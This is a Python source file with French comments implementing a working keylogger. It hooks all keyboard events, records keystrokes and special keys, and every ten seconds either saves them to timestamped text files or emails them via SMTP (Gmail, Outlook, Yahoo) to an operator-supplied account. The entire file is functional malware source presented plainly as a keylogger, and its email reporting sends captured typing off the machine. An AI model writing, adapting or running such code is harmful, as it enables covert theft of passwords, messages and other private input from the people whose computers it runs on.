import keyboard  # Bibliothèque pour intercepter les frappes clavier
import smtplib  # Bibliothèque pour envoyer un email via le protocole SMTP
from threading import Timer  # Permet de répéter une action à intervalle régulier
from datetime import datetime  # Pour gérer les dates et heures
from email.mime.multipart import MIMEMultipart  # Pour composer des emails complexes
from email.mime.text import MIMEText  # Pour ajouter du texte dans l'email
import getpass  # Pour saisir un mot de passe de manière sécurisée

# Dictionnaire contenant les serveurs SMTP pour différents fournisseurs d'email
SMTP_SERVERS = {
    "gmail": "smtp.gmail.com",
    "outlook": "smtp.office365.com",
    "hotmail": "smtp.office365.com",
    "yahoo": "smtp.mail.yahoo.com",
}


# Classe principale du keylogger
class Keylogger:
    def __init__(
        self,
        interval,
        report_method="email",
        email=None,
        password=None,
        smtp_server=None,
    ):
        """
        Initialise le keylogger avec un intervalle d'envoi, une méthode (email ou fichier),
        et les paramètres d'authentification si email est utilisé.
        """
        self.interval = interval  # Temps entre deux rapports
        self.report_method = report_method  # Méthode de rapport : "email" ou "file"
        self.log = ""  # Stocke les frappes clavier capturées
        self.start_dt = datetime.now()  # Date de début de la session
        self.end_dt = (
            datetime.now()
        )  # Date de fin de la session (mise à jour à chaque rapport)

        # Paramètres pour l'envoi par email
        self.email = email
        self.password = password
        self.smtp_server = smtp_server

    def callback(self, event):
        """
        Fonction appelée à chaque frappe détectée.
        Elle gère le texte à stocker, y compris les touches spéciales et événements shift/caps.
        """
        name = event.name

        # Gestion des touches Shift
        if name == "shift":
            if event.event_type == "down":
                self.log += "[SHIFT PRESSED]"
            elif event.event_type == "up":
                self.log += "[SHIFT RELEASED]"
            return

        # Gestion Caps Lock (toggle à chaque pression)
        if name == "caps lock" and event.event_type == "down":
            self.log += "[CAPS LOCK TOGGLED]"
            return

        # On ne traite que les événements "down" pour éviter doublons
        if event.event_type != "down":
            return

        # Gestion des touches spéciales
        special_keys = {
            "space": " ",
            "enter": "\n[ENTER]\n",
            "tab": "\t",
            "backspace": "[BACKSPACE]",
            "esc": "[ESC]",
            "ctrl": "[CTRL]",
            "alt": "[ALT]",
        }

        if name in special_keys:
            self.log += special_keys[name]
        elif len(name) == 1:
            self.log += name
        else:
            self.log += f"[{name.upper()}]"

    def update_filename(self):
        """
        Met à jour le nom de fichier à partir des dates de début et fin.
        """
        start = self.start_dt.strftime("%Y-%m-%d_%H-%M-%S")
        end = self.end_dt.strftime("%Y-%m-%d_%H-%M-%S")
        self.filename = f"keylog-{start}_to_{end}"

    def report_to_file(self):
        """
        Enregistre les frappes dans un fichier texte.
        """
        self.update_filename()
        with open(f"{self.filename}.txt", "w", encoding="utf-8") as f:
            f.write(self.log)
        print(f"[+] Sauvegardé dans {self.filename}.txt")

    def prepare_mail(self, message):
        """
        Prépare le contenu de l'email en version texte et HTML.
        """
        msg = MIMEMultipart("alternative")
        msg["From"] = self.email
        msg["To"] = self.email
        msg["Subject"] = "Rapport du keylogger"

        # Contenu texte brut et HTML
        text = MIMEText(message, "plain")
        html = MIMEText(f"<html><body><pre>{message}</pre></body></html>", "html")

        # Attache les deux versions à l'email
        msg.attach(text)
        msg.attach(html)
        return msg.as_string()

    def sendmail(self, verbose=1):
        """
        Envoie le rapport des frappes par email via SMTP.
        """
        try:
            server = smtplib.SMTP(self.smtp_server, 587)
            server.starttls()  # Sécurise la connexion
            server.login(self.email, self.password)
            server.sendmail(self.email, self.email, self.prepare_mail(self.log))
            server.quit()
            if verbose:
                print(f"[{datetime.now()}] Email envoyé avec succès.")
        except Exception as e:
            print(f"[ERREUR] Impossible d'envoyer l'email : {e}")

    def report(self):
        """
        Fonction appelée à chaque intervalle pour envoyer ou sauvegarder le rapport.
        """
        if self.log:
            self.end_dt = datetime.now()

            # Envoie selon la méthode choisie
            if self.report_method == "email":
                self.sendmail()
            elif self.report_method == "file":
                self.report_to_file()
                print(f"[{self.filename}] - {self.log}")

            # Réinitialise les logs
            self.start_dt = datetime.now()
            self.log = ""

        # Redémarre un timer pour relancer cette fonction plus tard
        timer = Timer(self.interval, self.report)
        timer.daemon = True
        timer.start()

    def start(self):
        """
        Démarre le keylogger : écoute des frappes + lancement du timer de rapport.
        """
        self.start_dt = datetime.now()
        keyboard.hook(callback=self.callback)  # Intercepte tous les événements clavier
        self.report()
        print(f"[{datetime.now()}] Keylogger démarré. Appuyez sur CTRL+C pour arrêter.")
        keyboard.wait()  # Boucle infinie jusqu'à interruption (CTRL+C)


# --- Partie principale : configuration utilisateur ---
if __name__ == "__main__":
    print("=== Keylogger Configuration ===")

    # Demande à l'utilisateur la méthode de rapport
    method = input("Méthode de rapport (email/file) : ").strip().lower()

    if method == "email":
        # Si email, demande des infos d'authentification
        email = input("Adresse email : ").strip()
        password = getpass.getpass("Mot de passe : ")
        provider = input("Fournisseur (gmail, outlook, yahoo, etc.) : ").strip().lower()

        if provider not in SMTP_SERVERS:
            print("[ERREUR] Fournisseur non reconnu.")
            exit(1)

        smtp_server = SMTP_SERVERS[provider]

        # Création du keylogger avec envoi par mail
        keylogger = Keylogger(
            interval=10,
            report_method="email",
            email=email,
            password=password,
            smtp_server=smtp_server,
        )
    else:
        # Mode local : sauvegarde dans un fichier
        keylogger = Keylogger(interval=10, report_method="file")

    # Démarrage du keylogger
    keylogger.start()
